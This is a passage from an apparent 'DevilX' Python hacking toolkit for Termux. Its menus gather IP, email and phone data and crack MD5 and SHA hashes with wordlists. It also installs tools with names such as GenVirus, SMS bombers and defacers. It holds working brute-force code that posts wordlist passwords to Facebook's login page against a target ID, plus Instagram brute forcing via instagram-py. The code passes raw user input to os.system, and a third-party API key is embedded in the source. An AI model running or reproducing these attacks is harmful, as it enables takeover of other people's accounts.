    print(" \033[1;91m➤\033[1;97m Reverse        : " + str(r.json() ['reverse'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Mobile         : " + str(r.json() ['mobile'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Proxy          : " + str(r.json() ['proxy'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Hosting        : " + str(r.json() ['hosting'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Location       : " + str(r.json() ['lat']) + ',' + str(r.json() ['lon']))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Google Map     : \033[1;94mhttps://maps.google.com/?q=" + str(r.json() ['lat']) + ',' + str(r.json() ['lon']))
    sleep(0.1)
    print()

    ## google map ###################
    gomap = input("\033[1;91m[*]\033[1;97m Press ENTER To Open Location on Google ")
    if gomap == "":
        print()
        print("[*] Opening Location on google map")
        print()
        os.system("xdg-open https://maps.google.com/?q=" + str(r.json() ['lat']) + ',' + str(r.json() ['lon']) + " > /dev/null 2>&1")
        print()

    else:
        print()
        print("\033[1;91m[*] Aborting...")
        print()


 
############### Get Email information ############################################################################

def mail():
    print()

    eml = requests.get("https://ipqualityscore.com/api/json/email/pPiATkSdtLn3xgKW7a7HikZeZ4HMNa2R/" + mailid )
    print()
    
    sleep(1)
    print()
    print("\033[1;91m[~]\033[1;97m E-mail Details are given down below")
    print()
    print("\033[1;91m➤\033[1;97m Target E-mail       : " + str(mailid) )
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Status Code         : " + str(eml.status_code) )
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Valid               : " + str(eml.json() ['valid']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Catch All           : " + str(eml.json() ['catch_all']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Common              : " + str(eml.json() ['common']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Deliverability      : " + str(eml.json() ['deliverability']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Disposable          : " + str(eml.json() ['disposable']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m DNS Valid           : " + str(eml.json() ['dns_valid']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Fraud Score         : " + str(eml.json() ['fraud_score']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Frequent Complainer : " + str(eml.json() ['frequent_complainer']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Generic             : " + str(eml.json() ['generic']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Honeypot            : " + str(eml.json() ['honeypot']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Leaked              : " + str(eml.json() ['leaked']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Message             : " + str(eml.json() ['message']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Over All Score      : " + str(eml.json() ['overall_score']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Recent Abuse        : " + str(eml.json() ['recent_abuse']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Request ID          : " + str(eml.json() ['request_id']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Sanitized E-mail    : " + str(eml.json() ['sanitized_email']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m SMTP Score          : " + str(eml.json() ['smtp_score']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Spam Trap Score     : " + str(eml.json() ['spam_trap_score']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Success             : " + str(eml.json() ['success']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Suggested Domain    : " + str(eml.json() ['suggested_domain']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Suspect             : " + str(eml.json() ['suspect']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Timed Out           : " + str(eml.json() ['timed_out']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m First Name          : " + str(eml.json() ['first_name']))
    sleep(0.1)
    print()
    print("\033[1;91m[~]\033[1;94m Domain Age")
    print()
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Human      : " + str(eml.json() ['domain_age'] ['human']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m ISO        : " + str(eml.json() ['domain_age'] ['iso']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Time Stamp : " + str(eml.json() ['domain_age'] ['timestamp']))
    sleep(0.1)
    print()
    print("\033[1;91m[~]\033[1;94m First Seen")
    print()
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Human      : " + str(eml.json() ['first_seen'] ['human']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m ISO        : " + str(eml.json() ['first_seen'] ['iso']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Time Stamp : " + str(eml.json() ['first_seen'] ['timestamp']))
    sleep(0.1)
    print()

############# Phone number information gathering ##############################################

def fonfo():
    print()

    phe = requests.get("https://ipqualityscore.com/api/json/phone/pPiATkSdtLn3xgKW7a7HikZeZ4HMNa2R/" + phonr )
    print()
    sleep(1)
    print()
    print("\033[1;91m[~]\033[1;97m Phone Number Details are given down below")
    print()
    print("\033[1;91m➤\033[1;97m Target Number  : " + phonr )
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Status Code    : " + str(phe.status_code) )
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Valid          : " + str(phe.json() ['valid']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m VOIP           : " + str(phe.json() ['VOIP']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Active         : " + str(phe.json() ['active']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Active Status  : " + str(phe.json() ['active_status']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Carrier        : " + str(phe.json() ['carrier']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m City           : " + str(phe.json() ['city']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Country        : " + str(phe.json() ['country']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Dialing Code   : " + str(phe.json() ['dialing_code']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Do Not Call    : " + str(phe.json() ['do_not_call']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Formatted      : " + str(phe.json() ['formatted']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Fraud Score    : " + str(phe.json() ['fraud_score']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Leaked         : " + str(phe.json() ['leaked']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Line Type      : " + str(phe.json() ['line_type']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Local Format   : " + str(phe.json() ['local_format']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m MCC            : " + str(phe.json() ['mcc']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Name           : " + str(phe.json() ['name']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Prepaid        : " + str(phe.json() ['prepaid']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Recent Abuse   : " + str(phe.json() ['recent_abuse']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Region         : " + str(phe.json() ['region']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Request ID     : " + str(phe.json() ['request_id']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Risky          : " + str(phe.json() ['risky']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m SMS Domain     : " + str(phe.json() ['sms_domain']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m SMS E-mail     : " + str(phe.json() ['sms_email']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Spammer        : " + str(phe.json() ['spammer']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Success        : " + str(phe.json() ['success']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m TimeZone       : " + str(phe.json() ['timezone']))
    sleep(0.1)
    print("\033[1;91m➤\033[1;97m Zip Code       : " + str(phe.json() ['zip_code']))
    sleep(0.1)
    print()







####################################### Main Script Starting ##########################################

os.system("xdg-open https://youtube.com/@Technolex")
sleep(5)

while True:
    os.system("clear")
    print(banner)
    mainx = input(main_menu)
    if mainx == "":
        print()
        print("\033[1;91m[!] No input detected")
        sleep(0.8)
        print()

    #######################Bruteforcing section#########################

    elif mainx == "1" or mainx == "01":
        print("\033[1;91m[*] \033[1;97mBrute force attack selected")
        while True:
            os.system("clear")
            print(banner)
            brutx = input(brute)
            if brutx == "":
                print("\n\033[1;91m[!] No input detected")
                sleep(0.8)

                ######################## email hacking ########################
            
            elif brutx == "01" or brutx == "1":
                print()
                while True:
                    usr = input("\033[1;91m[?]\033[1;97m Enter target E-mail ID: \033[1;91m")
                    if usr == '':
                        print("\033[1;91m[!] Email is required *")
                    else:
                        break

                while True:
                    passd = input(pass_mod)
                    if passd == "":
                        print("\033[1;91m[!] No input detected")

                    elif passd == "1" or passd == "01":
                        passlist = '/data/data/com.termux/DevilX/config/password/pass.txt'
                        print()
                        hackmail()
                        break
                    
                    elif passd == "2" or passd == "02":
                        print()
                        while True:
                            passlist = input("\033[1;91m[?]\033[1;97m Enter password list: ")
                            if passlist == '' :
                                print("\033[1;91m[!] Password list is required *")
                            else:
                                break
                        hackmail()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif passd == "95":
                        print("\033[1;91m[*] \033[1;97mGetting Back...")
                        sleep(0.7)
                        break
                    elif passd == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        print()
                        sleep(0.7)
                        exit()

            ######################### facebook hacking #######################

            elif brutx == "02" or brutx == "2":
                print()
                while True:
                    usr = input("\033[1;91m[?]\033[1;97m Enter target Facebook ID: \033[1;91m")
                    if usr == '':
                        print("\033[1;91m[!] Facebook ID is required *")
                    else:
                        break

                while True:
                    passd = input(pass_mod)
                    if passd == "":
                        print("\033[1;91m[!] No input detected")

                    elif passd == "1" or passd == "01":
                        passlist = '/data/data/com.termux/DevilX/config/password/pass.txt'
                        print()


                        if sys.version_info[0] !=3: 
                            sys.exit()
                            
                        post_url='https://www.facebook.com/login.php'
                        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',}
                        payload={}
                        cookie={}
                            
                        def create_form():
                            form=dict()
                            cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
                            
                            data=requests.get(post_url,headers=headers)
                            for i in data.cookies:
                                cookie[i.name]=i.value
                            data=BeautifulSoup(data.text,'html.parser').form
                            if data.input['name']=='lsd':
                                form['lsd']=data.input['value']
                            return (form,cookie)
                            
                        def function(email,passw,i):
                            global payload,cookie
                            if i%10==1:
                                payload,cookie=create_form()
                                payload['email']=email
                            payload['pass']=passw
                            r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
                            if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
                                open('temp','w').write(str(r.content))
                                print('\npassword is : ',passw)
                                return True
                            return False
                            
                        file=open(passlist,'r')
                            
                        print("\nTargeted ID :",usr)
                            
                        i=0
                        while file:
                            passw=file.readline().strip()
                            i+=1
                            if len(passw) < 6:
                                continue
                            print(str(i) +" : ",passw)
                            if function(usr,passw,i):
                                break
                        input("\033[1;94mPress ENTER To Continue")
                        break
                    
                    elif passd == "2" or passd == "02":
                        print()
                        while True:
                            passlist = input("\033[1;91m[?]\033[1;97m Enter password list: ")
                            if passlist == '' :
                                print("\033[1;91m[!] Password list is required *")
                            else:
                                break

                        if sys.version_info[0] !=3: 
                            sys.exit()
                            
                        post_url='https://www.facebook.com/login.php'
                        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',}
                        payload={}
                        cookie={}
                            
                        def create_form():
                            form=dict()
                            cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
                            
                            data=requests.get(post_url,headers=headers)
                            for i in data.cookies:
                                cookie[i.name]=i.value
                            data=BeautifulSoup(data.text,'html.parser').form
                            if data.input['name']=='lsd':
                                form['lsd']=data.input['value']
                            return (form,cookie)
                            
                        def function(email,passw,i):
                            global payload,cookie
                            if i%10==1:
                                payload,cookie=create_form()
                                payload['email']=email
                            payload['pass']=passw
                            r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
                            if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
                                open('temp','w').write(str(r.content))
                                print('\npassword is : ',passw)
                                return True
                            return False
                            
                        file=open(passlist,'r')
                            
                        print("\nTargeted ID :",usr)
                            
                        i=0
                        while file:
                            passw=file.readline().strip()
                            i+=1
                            if len(passw) < 6:
                                continue
                            print(str(i) +" : ",passw)
                            if function(usr,passw,i):
                                break
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif passd == "95":
                        print("\033[1;91m[*] \033[1;97mGetting Back...")
                        sleep(0.7)
                        break
                    elif passd == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        print()
                        sleep(0.7)
                        exit()

            ###################### instagram hacking ##########################
           
            elif brutx == "03" or brutx == "3":
                print()
                while True:
                    usr = input("\033[1;91m[?]\033[1;97m Enter target Instagram username: \033[1;91m")
                    if usr == '':
                        print("\033[1;91m[!] Username is required *")
                    else:
                        break

                while True:
                    passd = input(pass_mod)
                    if passd == "":
                        print("\033[1;91m[!] No input detected")

                    elif passd == "1" or passd == "01":
                        passlist = '/data/data/com.termux/DevilX/config/password/pass.txt'
                        os.system("instagram-py --username " + usr + " --password-list " + passlist)
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break
                    
                    elif passd == "2" or passd == "02":
                        print()
                        while True:
                            passlist = input("\033[1;91m[?]\033[1;97m Enter password list: ")
                            if passlist == '' :
                                print("\033[1;91m[!] Password list is required *")
                            else:
                                break

                        print()
                        os.system("instagram-py --username " + usr + " --password-list " + passlist)
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif passd == "95":
                        print("\033[1;91m[*] \033[1;97mGetting Back...")
                        sleep(0.7)
                        break
                    elif passd == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        print()
                        sleep(0.7)
                        exit()

            elif brutx == "95":
                print()
                print("\033[1;91m[*] \033[1;97mGetting Back...")
                sleep(0.8)
                break

            elif brutx == "99":
                print()
                print("\033[1;91m[*] Quitting...")
                print()
                sleep(0.9)
                exit()

            else:
                print()
                print("\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()
            
        ######################## webscraping section ########################

    elif mainx == "2" or mainx == "02":
        print()
        while True:
            os.system("clear")
            print(banner)
            scrp = input(webscr)
            if scrp == '':
                print()
                print("\033[1;91m[*] No input detected")
                sleep(0.8)
                print()

            elif scrp == '1' or scrp == '01':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Web page URL: ")
                    if url == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                print()
                os.system("curl " + url)
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif scrp == '2' or scrp == '02':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Web page URL: ")
                    if url == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                print()
                os.system("wget " + url)
                print()
                print("\033[1;91m[*]\033[1;97m Web page's file has been downloaded, and saved in your working directory.")
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif scrp == '3' or scrp == '03':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Website URL: ")
                    if url == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                print()
                os.system("wget -r " + url)
                print()
                print("\033[1;91m[*]\033[1;97m Website file has been downloaded, and saved in your working directory.")
                print()
                input("\033[1;94mPress ENTER To Continue")


            elif scrp == "95":
                print()
                print("\033[1;91m[*] \033[1;97mGetting Back...")
                sleep(0.8)
                break

            elif scrp == "99":
                print()
                print("\033[1;91m[*] Quitting...")
                print()
                sleep(0.9)
                exit()

            else:
                print()
                print("\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()

    ######################## Information gathering section ########################
            
    elif mainx == "3" or mainx == "03":
        while True:
            print()
            os.system("clear")
            print(banner)
            infx = input(getinfo)
            if infx == '':
                print("\n\033[1;91m[!] No input detected")
                sleep(0.7)

            elif infx == '1' or infx == '01':
                print()
                while True:
                    targetip = input("\033[1;91m[*]\033[1;97m Enter IP address: ")
                    if targetip == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                traceip()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '2' or infx == '02':
                print()
                while True:
                    mailid = input("\033[1;91m[*]\033[1;97m Enter E-mail ID: ")
                    if mailid == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                mail()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '3' or infx == '03':
                print()
                while True:
                    phonr = input("\033[1;91m[*]\033[1;97m Enter Phone Number: ")
                    if phonr == '':
                        print("\033[1;91m[!] No input detected")

                    else:
                        break
                
                fonfo()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == "95":
                print()
                print("\033[1;91m[*] \033[1;97mGetting Back...")
                sleep(0.8)
                break

            elif infx == "99":
                print()
                print("\033[1;91m[*] Quitting...")
                print()
                sleep(0.9)
                exit()

            else:
                print()
                print("\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()


    ######################### Hash cracking section #######################


    elif mainx == "4" or mainx == "04":
        print()
        while True:
            os.system('clear')
            print(banner)
            hasf = input(crackhash)
            if hasf == '':
                print("\n\033[1;91m[!] No input detected")
                sleep(0.7)

        ####################### MD5 hash cracking #########################

            elif hasf == '01' or hasf == '1':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter MD5 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    lisw = input(word_mod)
                    if lisw == '':
                        print("\033[1;91m[!] No input detected")

                    elif lisw == "01" or lisw == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        mds()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisw == '02' or lisw == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        mds()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisw == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif lisw == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()



                    else:
                        print("\033[1;91m[*] Invalid input")

            ####################### SHA1 Cracking #########################

            elif hasf == '02' or hasf == '2':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter SHA1 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    lisaw = input(word_mod)
                    if lisw == '':
                        print("\033[1;91m[!] No input detected")

                    elif lisaw == "01" or lisaw == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        shaa()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisaw == '02' or lisaw == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        shaa()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisaw == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif lisaw == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()



                    else:
                        print("\033[1;91m[*] Invalid input")

            ####################### SHA224  cracking #########################

            elif hasf == '03' or hasf == '3':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter SHA224 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    lisqw = input(word_mod)
                    if lisqw == '':
                        print("\033[1;91m[!] No input detected")

                    elif lisqw == "01" or lisqw == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        shaaa()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisqw == '02' or lisqw == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        shaaa()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisqw == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif lisqw == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()

                    else:
                        print("\033[1;91m[*] Invalid input")

            ######################## SHA256 cracking ########################

            elif hasf == '04' or hasf == '4':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter SHA256 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    lisww = input(word_mod)
                    if lisww == '':
                        print("\033[1;91m[!] No input detected")

                    elif lisww == "01" or lisww == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        shad()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisww == '02' or lisww == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        shad()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisww == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif lisww == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()



                    else:
                        print("\033[1;91m[*] Invalid input")

            ######################### SHA384 cracking #######################

            elif hasf == '05' or hasf == '5':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter SHA384 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    lisrw = input(word_mod)
                    if lisw == '':
                        print("\033[1;91m[!] No input detected")

                    elif lisrw == "01" or lisrw == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        shaf()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisrw == '02' or lisrw == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        shaf()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif lisrw == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif lisrw == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()



                    else:
                        print("\033[1;91m[*] Invalid input")

            ######################### SHA512 cracking #######################

            elif hasf == '06' or hasf == '6':
                print()
                while True:
                    pass_hash = input("\033[1;91m[?] \033[1;97mEnter SHA512 hash: ")
                    if pass_hash == '':
                        print("\033[1;91m[*] No input detected")
                    else:
                        break

                while True:
                    listw = input(word_mod)
                    if listw == '':
                        print("\033[1;91m[!] No input detected")

                    elif listw == "01" or listw == "1":
                        print()
                        wordlist = '/data/data/com.termux/DevilX/config/wordlist/wordlist.txt'
                        print()
                        shak()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif listw == '02' or listw == '2':
                        while True:
                            print()
                            wordlist = input("[?] Enter wordlist: ")
                            if wordlist == '':
                                print("\033[1;91m[!] No input detected")

                            else:
                                break

                        print()
                        shak()
                        print()
                        input("\033[1;94mPress ENTER To Continue")
                        break

                    elif listw == "95":
                        print()
                        print("\033[1;91m[*]\033[1;97m] Getting Back...")
                        sleep(0.7)
                        print()
                        break

                    elif listw == "99":
                        print()
                        print("\033[1;91m[*] Quitting...")
                        sleep(0.8)
                        print()
                        exit()



                    else:
                        print("\033[1;91m[*] Invalid input")


            elif hasf == "95":
                print()
                print("\033[1;91m[*] \033[1;97mGetting Back...")
                sleep(0.8)
                break

            elif hasf == "99":
                print()
                print("\033[1;91m[*] Quitting...")
                print()
                sleep(0.9)
                exit()

            else:
                print()
                print("\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()

    ########################### Password generator section #########################

    elif mainx == "5" or mainx == "05":
        print()
        genpassx()
        print()
        input("\033[1;94mPress ENTER To Continue")

    ######################### Hacking Tools installer section ###########################

    elif mainx == "6" or mainx == "06":
        while True:
            os.system("clear")
            print(banner)
            tolis = input(alltool)

            if tolis == '':
                print("\n\033[1;91m[!] No input detected")
                sleep(0.8)

            elif tolis == '1' or tolis == '01':
                os.system('clear')
                print(banner)
                print()
                print()
                bombs()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '2' or tolis == '02':
                os.system('clear')
                print(banner)
                print()
                print()
                AdminHack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '3' or tolis == '03':
                os.system('clear')
                print(banner)
                print()
                print()
                AllHackingTools()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '4' or tolis == '04':
                os.system('clear')
                print(banner)
                print()
                print()
                AOXdeface()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '5' or tolis == '05':
                os.system('clear')
                print(banner)
                print()
                print()
                apktool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '6' or tolis == '06':
                os.system('clear')
                print(banner)
                print()
                print()
                Asura()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '7' or tolis == '07':
                os.system('clear')
                print(banner)
                print()
                print()
                BeBomber()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '8' or tolis == '08':
                os.system('clear')
                print(banner)
                print()
                print()
                BannerX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '9' or tolis == '09':
                os.system('clear')
                print(banner)
                print()
                print()
                Beastb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '10':
                os.system('clear')
                print(banner)
                print()
                print()
                beyawak()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '11' :
                os.system('clear')
                print(banner)
                print()
                print()
                Brutegram()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '12' :
                os.system('clear')
                print(banner)
                print()
                print()
                brutxx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '13' :
                os.system('clear')
                print(banner)
                print()
                print()
                mrbrutex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '14' :
                os.system('clear')
                print(banner)
                print()
                print()
                camdump()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '15' :
                os.system('clear')
                print(banner)
                print()
                print()
                CloneWeb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '16' :
                os.system('clear')
                print(banner)
                print()
                print()
                CrackerTool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '17' :
                os.system('clear')
                print(banner)
                print()
                print()
                darkfly()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '18' :
                os.system('clear')
                print(banner)
                print()
                print()
                DecodeX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '19' :
                os.system('clear')
                print(banner)
                print()
                print()
                DefGen()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '20' :
                os.system('clear')
                print(banner)
                print()
                print()
                demozz()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '21' :
                os.system('clear')
                print(banner)
                print()
                print()
                DhAll()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '22' :
                os.system('clear')
                print(banner)
                print()
                print()
                DirAttack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '23' :
                os.system('clear')
                print(banner)
                print()
                print()
                dnsmp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '24' :
                os.system('clear')
                print(banner)
                print()
                print()
                dvrsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '25' :
                os.system('clear')
                print(banner)
                print()
                print()
                easyhack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '26' :
                os.system('clear')
                print(banner)
                print()
                print()
                findomain()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '27' :
                os.system('clear')
                print(banner)
                print()
                print()
                freefire()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '28' :
                os.system('clear')
                print(banner)
                print()
                print()
                fsociety()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '29' :
                os.system('clear')
                print(banner)
                print()
                print()
                GenVirus()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '30' :
                os.system('clear')
                print(banner)
                print()
                print()
                GeonumWh()
                print()
